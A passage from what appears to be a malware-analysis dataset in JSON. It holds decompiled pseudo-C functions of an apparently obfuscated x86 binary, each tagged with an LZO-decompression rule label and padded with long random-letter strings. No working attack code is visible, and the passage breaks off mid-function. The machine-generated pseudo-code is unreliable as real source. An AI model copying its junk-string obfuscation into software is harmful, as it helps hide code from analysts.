iVar1 = piVar6[4];\n        uVar10 = uVar9 + 1;\n        iVar12 = iVar1;\n        if (0xfff < uVar10) {\n            iVar12 = *(iVar1 + -4);\n            if (0x1f < (iVar1 + -4) - iVar12) goto code_r0x00410f18;\n            uVar10 = uVar9 + 0x24;\n        }\n        puVar5[-0x17] = uVar10;\n        puVar5[-0x18] = iVar12;\n        puVar5[-0x19] = 0x4109c5;\n        uVar9 = fcn.00401a32(puVar5[-0x18]);\n    }\n    puVar11 = puStack44;\n    puVar16 = puStack44 + -1;\n    puStack44[-1] = uVar9;\n    piStack40 = puVar11 + -0x12;\n    puVar11[-6] = 0;\n    puVar11[-2] = 0;\n    *puVar16 = 0xf;\n    *(puVar11 + -6) = 0;\n    *(puVar11 + -0x14) = uStack36;\n    puVar11[-0x13] = \"rzumxtvktbpcqwgwseqtzkguippbitrtebcnniepbgqyvugjscjoybnsxfboesdnr\";\n    puVar11[-0x15] = 0x41;\n    puVar11[-0x16] = 0x410a0e;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[7] = 0xf;\n    puVar5[6] = 4;\n    puVar5[2] = 0x736a706b;\n    *(puVar5 + 3) = 0;\n    *puVar5 = 0xed6;\n    puVar5[1] = 0x10d8;\n    *(puVar5 + 8) = 1;\n    puVar5[10] = 0x40d750c0;\n    puVar5[9] = 0;\n    *(puVar5 + 0xb) = 1;\n    puVar11[-0x16] = 0x410a52;\n    uVar8 = fcn.004030cb();\n    puVar11 = puStack44;\n    puStack44[-1] = uVar8;\n    piStack40 = puVar11 + -0x11;\n    puStack48 = puVar11 + -7;\n    puVar11[-7] = 0;\n    puVar11[-2] = 0xf;\n    puVar11[-3] = 2;\n    *(puVar11 + -7) = 0x7561;\n    *(puVar11 + -0x1a) = 0;\n    puVar11[-0xe] = 0;\n    puVar11[-10] = 0;\n    puVar11[-9] = 0xf;\n    *(puVar11 + -0xe) = 0;\n    uStack20 = 10;\n    *(puVar11 + -0x13) = uStack36;\n    puVar11[-0x12] = \"icxlraddtyzeecxuvkgszjyiphaucupayfxhfo\";\n    puVar11[-0x14] = 0x26;\n    puVar11[-0x15] = 0x410ac4;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[1] = 0x40cfa200;\n    *puVar5 = 0;\n    puVar5[2] = 0x41a;\n    puVar5[9] = 0xc37;\n    puVar5[0x10] = 0x2098;\n    uStack20 = 3;\n    puVar11[-0x15] = 0x410af5;\n    uVar8 = fcn.00403341();\n    puVar11 = puStack44;\n    puStack44[-1] = uVar8;\n    piStack40 = puVar11 + -0x12;\n    puStack48 = puVar11 + -0xc;\n    puVar11[-7] = 0xf;\n    puVar11[-8] = 7;\n    puVar11[-0xc] = 0x68656a61;\n    *(puVar11 + -0x2d) = 0x6d6a6a68;\n    *(puVar11 + -0x29) = 0;\n    puVar11[-0x12] = 0;\n    puVar11[-0xe] = 0;\n    puVar11[-0xd] = 0xf;\n    *(puVar11 + -0x12) = 0;\n    uStack20 = 9;\n    *(puVar11 + -0x14) = uStack36;\n    puVar11[-0x13] = \"bxqrusfbgeexmxbynphqovfxtdbdlvp\";\n    puVar11[-0x15] = 0x1f;\n    puVar11[-0x16] = 0x410b63;\n    fcn.00402f72();\n    puVar7 = piStack40;\n    *(piStack40 + 0x30) = 0;\n    puVar7[0x34] = 0;\n    *(puVar7 + 0x38) = *0x4ea370;\n    *(puVar7 + 0x3c) = *0x4ea374;\n    *(puVar7 + 0x40) = *0x4ea378;\n    *(puVar7 + 0x44) = *0x4ea37c;\n    uStack20 = 3;\n    puVar11[-0x16] = 0x410b85;\n    uVar8 = fcn.0040498f();\n    puVar11 = puStack44;\n    puVar17 = puStack44 + -1;\n    puStack44[-1] = uVar8;\n    piStack40 = puVar11 + -0x1f;\n    puStack48 = puVar11 + -6;\n    *puVar17 = 0xf;\n    puVar11[-2] = 0xd;\n    puVar11[-4] = 0x6d75686a;\n    *(puVar11 + -3) = 0x65;\n    puStack52 = puVar11 + -0xc;\n    puVar11[-0xc] = 0;\n    puVar11[-8] = *0x4ea390;\n    puVar11[-7] = *0x4ea394;\n    puVar11[-6] = str.ygdngric._0_4_;\n    puVar11[-5] = str.ygdngric._4_4_;\n    *(puVar11 + -0xc) = 0;\n    uStack20 = 5;\n    *(puVar11 + -0x21) = uStack36;\n    puVar11[-0x20] = \"dtwmrstoyusjowsqjvpbhcrmxmwrrjlsqrlvfjowllpbmcrfprgupydftqveydxvdmmdmrqmxvvfslp\";\n    puVar11[-0x22] = 0x4f;\n    puVar11[-0x23] = 0x410bf3;\n    fcn.00402f72();\n    puVar7 = piStack40;\n    puStack64 = piStack40 + 0x34;\n    *(piStack40 + 0x34) = 0;\n    *(puVar7 + 0x44) = 0;\n    *(puVar7 + 0x48) = 0xf;\n    puVar7[0x34] = 0;\n    uStack20 = 6;\n    *(puVar11 + -0x24) = uStack36;\n    puVar11[-0x23] = \"tyloohclddtltiumzcuijhactiofbmv\";\n    puVar11[-0x25] = 0x1f;\n    puVar11[-0x26] = 0x410c3a;\n    fcn.00402f72();\n    puVar7 = piStack40;\n    puStack60 = piStack40 + 0x1c;\n    *(piStack40 + 0x1c) = 0;\n    *(puVar7 + 0x2c) = 0;\n    *(puVar7 + 0x30) = 0xf;\n    puVar7[0x1c] = 0;\n    uStack20 = 7;\n    *(puVar11 + -0x27) = uStack36;\n    puVar11[-0x26] = \"opexsrpseenltapydzun\";\n    puVar11[-0x28] = 0x14;\n    puVar11[-0x29] = 0x410c81;\n    fcn.00402f72();\n    puVar7 = piStack40;\n    *(piStack40 + 4) = 0;\n    *(puVar7 + 0x14) = 0;\n    *(puVar7 + 0x18) = 0xf;\n    puVar7[4] = 0;\n    uStack20 = 8;\n    *(puVar11 + -0x2a) = uStack36;\n    puVar11[-0x29] = \"hswnmulbshrunskatqxdkxbfjjjuphxrdiqeinkwlesnkvupxaoxkuqweznjicxjaxmjuzkjhguontksvloxlnvt\";\n    puVar11[-0x2b] = 0x58;\n    puVar11[-0x2c] = 0x410cc7;\n    fcn.00402f72();\n    *piStack40 = 0;\n    uStack20 = 3;\n    puVar11[-0x2c] = 0x410cd9;\n    uVar8 = fcn.00402be4();\n    puVar11 = puStack44;\n    puStack44[-1] = uVar8;\n    piStack40 = puVar11 + -0x1d;\n    puStack48 = puVar11 + -0xc;\n    puVar11[-0xc] = 0;\n    puVar11[-8] = 0;\n    puVar11[-7] = 0xf;\n    *(puVar11 + -0xc) = 0;\n    *(puVar11 + -0x1f) = uStack36;\n    puVar11[-0x1e] = \"bqsjfnlndcmbencetnwtjytmddpshtjrzccjqupmtzpmiolagpmkdrifxr\";\n    puVar11[-0x20] = 0x3a;\n    puVar11[-0x21] = 0x410d22;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    puStack52 = piStack40 + 9;\n    piStack40[0xe] = 0xf;\n    puVar5[0xd] = 4;\n    puVar5[9] = 0x78767361;\n    *(puVar5 + 10) = 0;\n    puVar5[2] = 0;\n    puVar5[6] = 0;\n    puVar5[7] = 0xf;\n    *(puVar5 + 2) = 0;\n    uStack20 = 4;\n    *(puVar11 + -0x22) = uStack36;\n    puVar11[-0x21] = \"rzganjyslkamnwjfzdlmamifthcvxgrzmqrfqalbmxtdqmmcupifgfchgjpjqukvpeqjsfuyicrlqnwwnwgtijpnmmcixvbvl\"\n    ;\n    puVar11[-0x23] = 0x61;\n    puVar11[-0x24] = 0x410d87;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[1] = 0x40ba0600;\n    *puVar5 = 0;\n    *(puVar5 + 8) = 1;\n    puVar5[0x10] = 0x40af4a00;\n    puVar5[0xf] = 0;\n    puVar5[0x17] = *0x4ea3b0;\n    puVar5[0x18] = *0x4ea3b4;\n    puVar5[0x19] = *0x4ea3b8;\n    puVar5[0x1a] = *0x4ea3bc;\n    puVar5[0x1c] = 0x40cda580;\n    puVar5[0x1b] = 0;\n    uStack20 = 3;\n    puVar11[-0x24] = 0x410dce;\n    fcn.00403a08();\n    puVar11 = puStack44;\n    puVar18 = puStack44 + -1;\n    puStack44[-1] = 0x30;\n    puVar11[-2] = 0x410dda;\n    uVar8 = fcn.004024b9(*puVar18, *puVar11);\n    puVar11[-1] = 0x30;\n    puVar11[-2] = uVar8;\n    puVar11[-3] = 0x410de5;\n    fcn.00401a32(puVar11[-2]);\n    piStack40 = puVar11 + -10;\n    puStack44 = puVar11;\n    puVar11[-10] = 0;\n    puVar11[-6] = 0;\n    puVar11[-5] = 0xf;\n    *(puVar11 + -10) = 0;\n    *(puVar11 + -0xc) = uStack36;\n    puVar11[-0xb] = \"vysighitgflsprncjcsppmfplytkcpea\";\n    puVar11[-0xd] = 0x20;\n    puVar11[-0xe] = 0x410e28;\n    fcn.00402f72();\n    puVar7 = piStack40;\n    *(piStack40 + 0x1c) = 0x40e7de00;\n    *(puVar7 + 0x18) = 0;\n    puVar7[0x20] = 1;\n    *(puVar7 + 0x24) = 0x38e;\n    puVar11[-0xe] = 0x410e49;\n    uVar8 = fcn.004066bd();\n    puVar5 = puStack44;\n    puStack44[-1] = uVar8;\n    piStack40 = puVar5 + -0x11;\n    puVar5[-10] = 0;\n    puVar5[-6] = 0;\n    puVar5[-5] = 0xf;\n    *(puVar5 + -10) = 0;\n    puVar11 = puVar5 + -0x14;\n    *(puVar5 + -0x13) = uStack36;\n    puVar5[-0x12] = \"bxqzlzpzlkyypjedbbvrhavrdhtxmnicvaoca\";\n    puVar5[-0x14] = 0x25;\n    puVar5[-0x15] = 0x410e8f;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    *piStack40 = 0x5e9;\n    *(piVar6 + 1) = 1;\n    *(piVar6 + 2) = 0;\n    piVar6[3] = *0x4ea3d0;\n    piVar6[4] = *0x4ea3d4;\n    piVar6[5] = *0x4ea3d8;\n    piVar6[6] = *0x4ea3dc;\n    piVar6[0xe] = 0x40e9f5c0;\n    piVar6[0xd] = 0;\n    piVar6[0xf] = 0x13c8;\n    *(piVar6 + 0x10) = 0;\n    uVar9 = piVar6[0xc];\n    if (0xf < uVar9) {\n        iVar1 = piVar6[7];\n        uVar10 = uVar9 + 1;\n        iVar12 = iVar1;\n        if (0xfff < uVar10) {\n            iVar12 = *(iVar1 + -4);\n            if (0x1f < (iVar1 + -4) - iVar12) goto code_r0x00410f24;\n            uVar10 = uVar9 + 0x24;\n        }\n        puVar5[-0x15] = uVar10;\n        puVar5[-0x16] = iVar12;\n        puVar5[-0x17] = 0x410ef5;\n        fcn.00401a32(puVar5[-0x16]);\n    }\n    *in_FS_OFFSET = iStack28;\n    return puStack56;\n}\n",
        "token_count": 10457
    },
    "00403fdf": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00403fdf(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_0000003c;\n    uint32_t in_stack_ffffff38;\n    uint32_t in_stack_ffffff50;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    ushort uStack96;\n    uchar uStack94;\n    uint uStack92;\n    uint uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    uint32_t uStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack24 = 0x44c140;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 8;\n    pcStack136 = \"pbtscjdwbiqzisnguinvtssdvvjcgcxdxqfqwthnnkcjedmqstziivbilfecwrvlwzxilcpwyuh\";\n    auStack144[0] = 0x4b;\n    fcn.00402f72();\n    uStack88 = 0xf;\n    uStack92 = 0xe;\n    uStack108 = 0x656a6668;\n    uStack104 = 0x71786a6d;\n    uStack100 = 0x68687478;\n    uStack96 = 0x676e;\n    uStack94 = 0;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x4b, uStack60, \"pbtscjdwbiqzisnguinvtssdvvjcgcxdxqfqwthnnkcjedmqstziivbilfecwrvlwzxilcpwyuh\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    uStack60 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x4b, uStack36, \"pbtscjdwbiqzisnguinvtssdvvjcgcxdxqfqwthnnkcjedmqstziivbilfecwrvlwzxilcpwyuh\");\n    if (uStack40 < 0x10) {\ncode_r0x00422a7a:\n        if (0xf < uStack64) {\n            in_stack_ffffff50 = uStack64 + 1;\n            iVar2 = iStack84;\n            if (0xfff < in_stack_ffffff50) {\n                iVar2 = *(iStack84 + -4);\n                if (0x1f < (iStack84 + -4) - iVar2) goto code_r0x00422d37;\n                in_stack_ffffff50 = uStack64 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack68 = 0;\n        uStack64 = 0xf;\n        iStack84 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x4b, in_stack_ffffff50 & 0xffffff00 | uStack60 & 0xff, \n                     \"pbtscjdwbiqzisnguinvtssdvvjcgcxdxqfqwthnnkcjedmqstziivbilfecwrvlwzxilcpwyuh\");\n        uStack44 = 0;\n        uStack40 = 0xf;\n        uStack60 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x4b, uStack36, \"pbtscjdwbiqzisnguinvtssdvvjcgcxdxqfqwthnnkcjedmqstziivbilfecwrvlwzxilcpwyuh\");\n        if (0xf < uStack40) {\n            in_stack_ffffff38 = uStack40 + 1;\n            uVar1 = uStack60;\n            if (0xfff < in_stack_ffffff38) {\n                uVar1 = *(uStack60 - 4);\n                if (0x1f < (uStack60 - 4) - uVar1) goto code_r0x00422d43;\n                in_stack_ffffff38 = uStack40 + 0x24;\n            }\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack64) {\n            in_stack_ffffff38 = uStack64 + 1;\n            iVar2 = iStack84;\n            if (0xfff < in_stack_ffffff38) {\n                iVar2 = *(iStack84 + -4);\n                if (0x1f < (iStack84 + -4) - iVar2) goto code_r0x00422d4f;\n                in_stack_ffffff38 = uStack64 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack68 = 0;\n        uStack64 = 0xf;\n        iStack84 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x4b, in_stack_ffffff38 & 0xffffff00 | uStack60 & 0xff, \n                     \"pbtscjdwbiqzisnguinvtssdvvjcgcxdxqfqwthnnkcjedmqstziivbilfecwrvlwzxilcpwyuh\");\n        uStack44 = 0;\n        uStack40 = 0xf;\n        uStack60 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x4b, uStack36, \"pbtscjdwbiqzisnguinvtssdvvjcgcxdxqfqwthnnkcjedmqstziivbilfecwrvlwzxilcpwyuh\");\n        if (0xf < uStack40) {\n            uVar1 = uStack60;\n            if ((0xfff < uStack40 + 1) && (uVar1 = *(uStack60 - 4),  0x1f < (uStack60 - 4) - uVar1))\n            goto code_r0x00422d5b;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x00422d67;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x00422d73;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000003c) {\n            iVar2 = in_stack_00000028;\n            if ((0xfff < in_stack_0000003c + 1) &&\n               (iVar2 = *(in_stack_00000028 + -4),  0x1f < (in_stack_00000028 + -4) - iVar2)) goto code_r0x00422d7f;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    in_stack_ffffff50 = uStack40 + 1;\n    uVar1 = uStack60;\n    if (in_stack_ffffff50 < 0x1000) {\ncode_r0x00422a6e:\n        fcn.00401a32(uVar1);\n        goto code_r0x00422a7a;\n    }\n    uVar1 = *(uStack60 - 4);\n    if ((uStack60 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff50 = uStack40 + 0x24;\n        goto code_r0x00422a6e;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00422d37:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00422d43:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00422d4f:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00422d5b:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00422d67:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00422d73:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x00422d7f:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 2283
    },
    "0040404d": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.0040404d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_0000003c;\n    int32_t in_stack_00000040;\n    uint32_t in_stack_00000054;\n    int32_t in_stack_00000068;\n    uint32_t in_stack_0000007c;\n    int32_t aiStack132 [4];\n    uint uStack116;\n    uint32_t uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    ushort uStack96;\n    uint uStack92;\n    uint uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack132;\n    uStack24 = 0x44cb90;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    aiStack132[0] = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x3e);\n    uStack88 = 0xf;\n    uStack92 = 0xd;\n    uStack108 = 0x676d7977;\n    uStack104 = 0x62766f66;\n    uStack100 = 0x766b6c68;\n    uStack96 = 0x65;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x15, iStack60, \"zrwdogucbttspjkywskue\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x5e, uStack36, \n                 \"gceezufeopjkkqnhjxmskocbzymriixorxcetquhamirknwimovufdymftpgvtgszwfjzfeqjamqpdmegtacpnictrlqlr\");\n    if (uStack40 < 0x10) {\ncode_r0x00441e94:\n        if (0xf < uStack64) {\n            iVar1 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar1 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar1))\n            goto code_r0x0044203f;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack112) {\n            iVar1 = aiStack132[0];\n            if ((0xfff < uStack112 + 1) && (iVar1 = *(aiStack132[0] + -4),  0x1f < (aiStack132[0] + -4) - iVar1))\n            goto code_r0x0044204b;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar1 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar1 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar1))\n            goto code_r0x00442057;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_0000003c) {\n            iVar1 = in_stack_00000028;\n            if ((0xfff < in_stack_0000003c + 1) &&\n               (iVar1 = *(in_stack_00000028 + -4),  0x1f < (in_stack_00000028 + -4) - iVar1)) goto code_r0x00442063;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000054) {\n            iVar1 = in_stack_00000040;\n            if ((0xfff < in_stack_00000054 + 1) &&\n               (iVar1 = *(in_stack_00000040 + -4),  0x1f < (in_stack_00000040 + -4) - iVar1)) goto code_r0x0044206f;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_0000007c) {\n            iVar1 = in_stack_00000068;\n            if ((0xfff < in_stack_0000007c + 1) &&\n               (iVar1 = *(in_stack_00000068 + -4),  0x1f < (in_stack_00000068 + -4) - iVar1)) goto code_r0x0044207b;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x54285c;\n    }\n    iVar1 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(iStack60 + -4),  (iStack60 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x00441e94;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0044203f:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0044204b:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00442057:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00442063:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0044206f:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0044207b:\n    uStack20 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 1574
    },
    "00404070": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404070(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    \n    *arg_ch = *arg_ch + 0x23;\n    iVar1 = *(*arg_8h + -4);\n    if ((*arg_8h - iVar1) - 4U < 0x20) {\n        *arg_8h = iVar1;\n        return;\n    }\n    fcn.00405fba(0, 0, 0, 0, 0);\n    fcn.004035f8(0, 0, 0, 0, 0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 172
    },
    "0040407a": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.0040407a(uint param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c490;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x5c);\n    if (0xf < uStack40) {\n        iVar1 = aiStack60[0];\n        if ((0xfff < uStack40 + 1) && (iVar1 = *(aiStack60[0] + -4),  0x1f < (aiStack60[0] + -4) - iVar1)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0042d98a;\n        }\n        fcn.00401a32(iVar1);\n    }\n    if (0xf < in_stack_00000020) {\n        iVar1 = param_3;\n        if ((0xfff < in_stack_00000020 + 1) && (iVar1 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar1)) {\ncode_r0x0042d98a:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fcn.00403a76();\n            return;\n        }\n        fcn.00401a32(iVar1);\n    }\n    *in_FS_OFFSET = piStack28;\n    return;\n}\n",
        "token_count": 477
    },
    "00404084": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00404084(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    uint auStack120 [2];\n    char *pcStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack24 = 0x44cb60;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack88 = 0xf;\n    uStack92 = 0xf;\n    uStack108 = 0x796b6c69;\n    uStack104 = 0x79747a6f;\n    uStack100 = 0x7163637a;\n    uStack96 = 0x746973;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 3;\n    pcStack112 = \"ufohiyyygpenqzsqcjkcvurlsrxjuhxso\";\n    auStack120[0] = 0x21;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x21, uStack36, \"xmwamafqgfkjefztgbwnodhztibfpmute\");\n    if (uStack40 < 0x10) {\ncode_r0x00441837:\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x004418cc;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar2 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar2 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar2)) goto code_r0x004418d8;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0x122d1;\n    }\n    iVar2 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(iStack60 + -4),  (iStack60 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00441837;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004418cc:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004418d8:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 880
    },
    "00404124": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.00404124(uint *param_1, uint param_2, int32_t param_3)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    int32_t in_stack_0000002c;\n    uint32_t in_stack_00000040;\n    int32_t in_stack_00000044;\n    uint32_t in_stack_00000058;\n    int32_t in_stack_00000064;\n    uint32_t in_stack_00000078;\n    int32_t aiStack64 [4];\n    uint uStack48;\n    uint32_t uStack44;\n    uint *puStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack64;\n    uStack24 = 0x414a50;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack40 = param_1;\n    uStack48 = 0;\n    uStack44 = 0xf;\n    aiStack64[0] = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x25);\n    puStack40[5] = 0xf;\n    puStack40[4] = 0xb;\n    *puStack40 = 0x61687964;\n    puStack40[1] = 0x61686671;\n    *(puStack40 + 7) = 0x73687761;\n    *(puStack40 + 0xb) = 0;\n    if (uStack44 < 0x10) {\ncode_r0x00412e25:\n        if (0xf < in_stack_00000020) {\n            iVar2 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar2 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar2))\n            goto code_r0x00412f64;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000040) {\n            iVar2 = in_stack_0000002c;\n            if ((0xfff < in_stack_00000040 + 1) &&\n               (iVar2 = *(in_stack_0000002c + -4),  0x1f < (in_stack_0000002c + -4) - iVar2)) goto code_r0x00412f70;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000058) {\n            iVar2 = in_stack_00000044;\n            if ((0xfff < in_stack_00000058 + 1) &&\n               (iVar2 = 